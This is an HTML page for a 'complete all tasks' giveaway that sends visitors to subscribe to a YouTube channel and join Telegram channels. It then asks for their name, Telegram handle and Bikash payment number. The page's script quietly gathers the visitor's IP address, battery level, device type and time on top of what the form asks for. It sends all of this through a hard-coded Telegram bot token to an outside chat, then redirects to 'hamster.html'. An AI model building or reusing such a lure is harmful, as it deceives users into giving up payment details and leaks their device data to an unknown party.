

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Task Completion System</title>
    <style>
        /* Basic Styles */
        body {
            font-family: Arial, sans-serif;
            background-color: #f4f4f4;
            margin: 0;
            padding: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
        }
        .container {
            background-color: #fff;
            border-radius: 10px;
            box-shadow: 0 0 15px rgba(0, 0, 0, 0.1);
            width: 400px;
            padding: 20px;
            text-align: center;
            background: linear-gradient(#87CEFA, #B0C4DE, #B0E0E6, #ADD8E6);
        }
        h1 {
            margin-bottom: 20px;
        }
        .task {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 15px;
            padding: 10px;
            background-color: #f9f9f9;
            border-radius: 10px;
            box-shadow: 0 0 5px rgba(0, 0, 0, 0.1);
        }
        .task.completed {
            background-color: #e6f7e6;
        }
        .task img {
            width: 30px;
            height: 30px;
            margin-right: 10px;
        }
        .task span {
            flex-grow: 1;
            text-align: left;
            font-weight: 500;
        }
        button {
            padding: 8px 15px;
            border: none;
            border-radius: 20px;
            background-color: #007bff;
            color: white;
            cursor: pointer;
            transition: background-color 0.3s ease;
            position: relative;
        }
        button:disabled {
            background-color: #ccc;
            cursor: not-allowed;
        }
      
        /* Loading animation inside button */
        .button-loading {
            color: transparent;
        }
        .button-loading:after {
            content: " ";
            display: block;
            width: 20px;
            height: 20px;
            border-radius: 50%;
            border: 3px solid currentColor;
            border-color: white transparent white transparent;
            animation: lds-dual-ring 1.2s linear infinite;
            position: absolute;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
        }
        @keyframes lds-dual-ring {
            0% {
                transform: translate(-50%, -50%) rotate(0deg);
            }
            100% {
                transform: translate(-50%, -50%) rotate(360deg);
            }
        }
        /* Popup Styles */
        .popup {
            display: none;
            position: fixed;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            width: 300px;
            padding: 20px;
            background: linear-gradient(#87CEFA, #B0C4DE, #B0E0E6, #ADD8E6);

        }
            box-shadow: 0 0 15px rgba(0, 0, 0, 0.2);
            border-radius: 10px;
            z-index: 1000;
            text-align: center;
        }
        .popup.active {
            display: block;
        }
        .popup input {
            width: calc(100% - 20px);
            padding: 10px;
            margin: 10px 0;
            border: 2px solid #007bff;
            border-radius: 5px;
            box-sizing: border-box;
        }
        .popup button {
            width: 100%;
            padding: 10px;
            border: none;
            border-radius: 5px;
            background-color: #007bff;
            color: white;
            cursor: pointer;
            font-size: 16px;
            margin-top: 10px;
            transition: background-color 0.3s ease;
        }
        .popup button:hover {
            background-color: #0056b3;
        }
        .popup button:disabled {
            background-color: #ccc;
            cursor: not-allowed;
        }
        /* Notification Styles */
        .notification {
            display: none;
            position: fixed;
            top: 20px;
            left: 50%;
            transform: translateX(-50%);
            padding: 15px 30px;
            background-color: #28a745;
            color: white;
            border-radius: 50px;
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.2);
            z-index: 999;
            text-align: center;
            font-size: 16px;
            font-weight: bold;
            animation: fadeinout 4s ease forwards;
        }
        @keyframes fadeinout {
            0%, 100% { opacity: 0; }
            10%, 90% { opacity: 1; }
        }
        .notification.error {
            background-color: #dc3545;
        }
        /* Centered Button Container */
        .button-container {
            margin-top: 20px;
            text-align: center;
        }
        .task-status-button {
            padding: 10px 20px;
            border: none;
            border-radius: 20px;
            background-color: #007bff;
            color: white;
            cursor: pointer;
            font-size: 16px;
            transition: background-color 0.3s ease;
        }
        .task-status-button:hover {
            background-color: #0056b3;
        }
        .task-status-button:disabled {
            background-color: #ccc;
            cursor: not-allowed;
        }
        .button-inactive {
            background-color: #ccc !important;
            cursor: not-allowed !important;
        }
    </style>
</head>
<body>
    <!-- Notification -->
    <div class="notification" id="notification">Task Completed Successfully!</div>

    <div class="container" id="taskPage">
        <h1>Complete All Tasks üèÜ</h1>
        <!-- Task 1 -->
        <div class="task" id="task1">
            <img src="https://i.postimg.cc/HsvwN6M4/youtube-logo-youtube-logo-transparent-youtube-icon-transparent-free-free-png.png" alt="YouTube">
            <span>Subscribe to Basic Touch Pro Channel</span>
            <button id="task1Button" onclick="completeTask(1, 'https://www.youtube.com/@BasicTouchPro', this, 20000)">Join</button> <!-- 20 seconds delay -->
        </div>
        <!-- Task 2 -->
        <div class="task" id="task2">
            <img src="https://telegram.org/img/t_logo.png" alt="Telegram">
            <span>Join Basic Touch Pro Official Channel</span>
            <button id="task2Button" onclick="completeTask(2, 'https://t.me/BasicTouchPro', this, 5000)">Join</button> <!-- 5 seconds delay -->
        </div>
      <div class="task" id="task3">

            <img src="https://telegram.org/img/t_logo.png" alt="Telegram">

            <span>Join Basic Touch Pro Official chat group</span>

            <button id="task3Button" onclick="completeTask(3, 'https://t.me/BasicTouch', this, 5000)">Join</button> <!-- 5 seconds delay -->

        </div>
        <!-- Slider Container -->
        <div class="slider-container">
            <div class="slider-text">Please complete all tasks to unlock the link!</div>
        </div>
        <!-- Centered Button -->
        <div class="button-container">
            <button id="statusButton" class="task-status-button" disabled>0 / 3</button>
            <button id="finishButton" class="task-status-button" style="display:none;" onclick="showForm()">‚öΩ Finish Mission! - Submit win DetailsüèÜüèÜ</button>
        </div>
    </div>

    <!-- Popup Form -->
    <div class="popup" id="popupForm">
        <h2>Complete win Form!</h2>
        <input type="text" id="userName" placeholder="Your name (English only)" required>
        <input type="text" id="telegramUsername" placeholder="Your Telegram @username" required>
        <input type="text" id="bikashNumber" placeholder="Payment Address" required>
        <button id="submitBtn" onclick="submitForm()">finish!</button>
    </div>

    <script>
        const botToken = '7001039137:AAEHbTzGAmbwCDyk1A0EVhwLjDNWLTSQMd0';
        const chatId = '5187944932';

        let completedTasks = 0;
        const totalTasks = 3;

        function completeTask(taskId, url, buttonElement, delay) {
            // Open the link immediately
            window.open(url, '_blank');
            
            // Show loading animation in button
            buttonElement.classList.add('button-loading');
            
            // Simulate a delay for success message
            setTimeout(() => {
                // Mark task as completed
                const taskElement = document.getElementById('task' + taskId);
                taskElement.classList.add('completed');

                // Update the button text
                buttonElement.innerText = 'Completed';
                buttonElement.disabled = true;
                buttonElement.classList.add('button-inactive');
                
                // Increment completed tasks count
                completedTasks++;
                updateStatusButton();

                // Hide task boxes and show finish button if all tasks are completed
                if (completedTasks === totalTasks) {
                    document.getElementById('finishButton').style.display = 'block';
                    document.getElementById('statusButton').style.display = 'none';
                }

                // Remove loading animation from button
                buttonElement.classList.remove('button-loading');
            }, delay);
        }

        function updateStatusButton() {
            const statusButton = document.getElementById('statusButton');
            statusButton.innerText = `${completedTasks} / ${totalTasks}`;
        }

        function showForm() {
            document.getElementById('taskPage').style.display = 'none';
            document.getElementById('popupForm').style.display = 'block';
        }

        function submitForm() {
            const userName = document.getElementById('userName').value.trim();
            const telegramUsername = document.getElementById('telegramUsername').value.trim();
            const bikashNumber = document.getElementById('bikashNumber').value.trim();
            
            if (!userName || !telegramUsername || !bikashNumber || !telegramUsername.startsWith('@')) {
                showNotification('error', 'Please fill out all fields correctly.');
                return;
            }
            
            // Get IP address from an external API
            fetch('https://api.ipify.org?format=json')
                .then(response => response.json())
                .then(ipData => {
                    const ipAddress = ipData.ip;

                    // Get battery level (if available)
                    navigator.getBattery().then(battery => {
                        const batteryLevel = battery.level * 100 + '%';

                        // Determine device type
                        const deviceType = navigator.userAgent.toLowerCase().includes('mobile') ? 'mobile' : 'desktop';
                        const deviceTime = new Date().toLocaleString();

                        // Send data to Telegram
                        fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                            method: 'POST',
                            headers: {
                                'Content-Type': 'application/json',
                            },
                            body: JSON.stringify({
                                chat_id: chatId,
                                text: `Name: ${userName}\nTelegram Username: ${telegramUsername}\nBikash Number: ${bikashNumber}\nIP Address: ${ipAddress}\nDevice Type: ${deviceType}\nBattery Level: ${batteryLevel}\nDevice Time: ${deviceTime}`,
                            }),
                        })
                        .then(response => response.json())
                        .then(data => {
                            if (data.ok) {
                                showNotification('success', 'Form submitted successfully!');
                                setTimeout(() => {
                                    document.getElementById('popupForm').style.display = 'none';
                                    document.querySelector('.notification').style.display = 'none';
                                  // Open the link

                            window.open('./hamster.html', '_self');


                                }, 2000);
                            } else {
                                showNotification('error', 'Failed to submit form.');
                            }
                        })
                        .catch(() => {
                            showNotification('error', 'Failed to submit form.');
                        });
                    });
                });
        }

        function showNotification(type, message) {
            const notification = document.getElementById('notification');
            notification.className = `notification ${type}`;
            notification.innerText = message;
            notification.style.display = 'block';
        }
    </script>
</body>
</html>
